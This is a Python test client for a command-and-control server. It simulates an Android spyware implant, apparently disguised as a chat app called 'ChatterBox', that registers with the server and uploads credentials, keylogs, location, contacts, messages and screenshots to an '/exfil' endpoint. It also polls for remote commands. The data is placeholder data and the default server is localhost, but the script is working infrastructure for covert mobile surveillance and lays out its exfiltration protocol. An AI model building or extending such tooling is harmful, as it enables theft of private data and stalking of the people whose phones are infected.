#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Test client for the C2 Server
This script sends test data to the C2 server to simulate a mobile client
"""

import requests
import json
import time
import uuid
import random
import datetime
import argparse
import ssl
import urllib3
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
urllib3.disable_warnings(InsecureRequestWarning)

DEFAULT_SERVER = "http://127.0.0.1:42069"

class C2TestClient:
    def __init__(self, server_url=DEFAULT_SERVER):
        self.server_url = server_url
        self.device_id = f"test_device_{uuid.uuid4().hex[:8]}"
        self.headers = {
            "Content-Type": "application/json",
            "User-Agent": "ChatterBox/1.0.0"
        }
        
        print(f"Test client initialized with device ID: {self.device_id}")
        print(f"Server URL: {self.server_url}")
    
    def register_device(self):
        """Register device with the C2 server"""
        print("\n=== Registering device ===")
        
        registration_data = {
            "device_id": self.device_id,
            "device_info": {
                "model": "Test Phone",
                "manufacturer": "Test Manufacturer",
                "android_version": "12",
                "app_version": "1.0.0"
            }
        }
        
        try:
            response = requests.post(
                f"{self.server_url}/register",
                headers=self.headers,
                json=registration_data,
                verify=False  # Ignore SSL verification
            )
            
            print(f"Response status: {response.status_code}")
            if response.status_code == 200:
                print(f"Response data: {json.dumps(response.json(), indent=2)}")
                return True
            else:
                print(f"Error response: {response.text}")
                return False
        except Exception as e:
            print(f"Error registering device: {str(e)}")
            return False
    
    def send_data(self, data_type, data):
        """Send data to the C2 server"""
        print(f"\n=== Sending {data_type} data ===")
        
        exfil_data = {
            "device_id": self.device_id,
            "type": data_type,
            "timestamp": datetime.datetime.now().isoformat(),
            "data": data
        }
        
        try:
            response = requests.post(
                f"{self.server_url}/exfil",
                headers=self.headers,
                json=exfil_data,
                verify=False  # Ignore SSL verification
            )
            
            print(f"Response status: {response.status_code}")
            if response.status_code == 200:
                print(f"Response data: {json.dumps(response.json(), indent=2)}")
                return True
            else:
                print(f"Error response: {response.text}")
                return False
        except Exception as e:
            print(f"Error sending data: {str(e)}")
            return False
    
    def check_commands(self):
        """Check for commands from the C2 server"""
        print("\n=== Checking for commands ===")
        
        command_data = {
            "device_id": self.device_id
        }
        
        try:
            response = requests.post(
                f"{self.server_url}/command",
                headers=self.headers,
                json=command_data,
                verify=False  # Ignore SSL verification
            )
            
            print(f"Response status: {response.status_code}")
            if response.status_code == 200:
                print(f"Response data: {json.dumps(response.json(), indent=2)}")
                return True
            else:
                print(f"Error response: {response.text}")
                return False
        except Exception as e:
            print(f"Error checking commands: {str(e)}")
            return False
    
    def run_test_sequence(self):
        """Run a complete test sequence"""
        # Step 1: Register device
        if not self.register_device():
            print("Registration failed, stopping test sequence")
            return
        
        time.sleep(1)
        
        # Step 2: Send various types of data
        data_types = {
            "credentials": {
                "username": "test@example.com",
                "password": "password123",
                "app": "TestApp"
            },
            "keylog": {
                "text": "Test keylog data",
                "app": "TestKeylogger"
            },
            "location": {
                "latitude": 37.7749 + (random.random() - 0.5) * 0.01,
                "longitude": -122.4194 + (random.random() - 0.5) * 0.01,
                "accuracy": random.uniform(5.0, 20.0)
            },
            "contacts": {
                "contacts": [
                    {"name": "John Doe", "phone": "+1234567890", "email": "john@example.com"},
                    {"name": "Jane Smith", "phone": "+0987654321", "email": "jane@example.com"}
                ]
            },
            "messages": {
                "messages": [
                    {"from": "Alice", "to": "Bob", "content": "Hello Bob, how are you?", "time": datetime.datetime.now().isoformat()},
                    {"from": "Bob", "to": "Alice", "content": "I'm good, thanks!", "time": datetime.datetime.now().isoformat()}
                ]
            },
            "screenshots": {
                "timestamp": datetime.datetime.now().isoformat(),
                "description": "Test screenshot"
            }
        }
        
        for data_type, data in data_types.items():
            self.send_data(data_type, data)
            time.sleep(1)
        
        # Step 3: Check for commands
        self.check_commands()

def parse_arguments():
    parser = argparse.ArgumentParser(description="Test client for the C2 Server")
    parser.add_argument("--server", type=str, default=DEFAULT_SERVER, help=f"C2 server URL (default: {DEFAULT_SERVER})")
    parser.add_argument("--skip-registration", action="store_true", help="Skip device registration")
    parser.add_argument("--data-type", type=str, help="Send only a specific data type (credentials, keylog, location, contacts, messages, screenshots)")
    parser.add_argument("--commands", action="store_true", help="Only check for commands")
    
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()
    
    client = C2TestClient(server_url=args.server)
    
    if args.commands:
        # Only check for commands
        client.check_commands()
    elif args.data_type:
        # Send only a specific data type
        if not args.skip_registration:
            client.register_device()
            time.sleep(1)
        
        # Create sample data for the specified type
        sample_data = {
            "credentials": {
                "username": "test@example.com",
                "password": "password123",
                "app": "TestApp"
            },
            "keylog": {
                "text": "Test keylog data",
                "app": "TestKeylogger"
            },
            "location": {
                "latitude": 37.7749 + (random.random() - 0.5) * 0.01,
                "longitude": -122.4194 + (random.random() - 0.5) * 0.01,
                "accuracy": random.uniform(5.0, 20.0)
            },
            "contacts": {
                "contacts": [
                    {"name": "John Doe", "phone": "+1234567890", "email": "john@example.com"},
                    {"name": "Jane Smith", "phone": "+0987654321", "email": "jane@example.com"}
                ]
            },
            "messages": {
                "messages": [
                    {"from": "Alice", "to": "Bob", "content": "Hello Bob, how are you?", "time": datetime.datetime.now().isoformat()},
                    {"from": "Bob", "to": "Alice", "content": "I'm good, thanks!", "time": datetime.datetime.now().isoformat()}
                ]
            },
            "screenshots": {
                "timestamp": datetime.datetime.now().isoformat(),
                "description": "Test screenshot"
            }
        }
        
        if args.data_type in sample_data:
            client.send_data(args.data_type, sample_data[args.data_type])
        else:
            print(f"Unknown data type: {args.data_type}")
            print(f"Available data types: {', '.join(sample_data.keys())}")
    else:
        # Run the complete test sequence
        client.run_test_sequence()
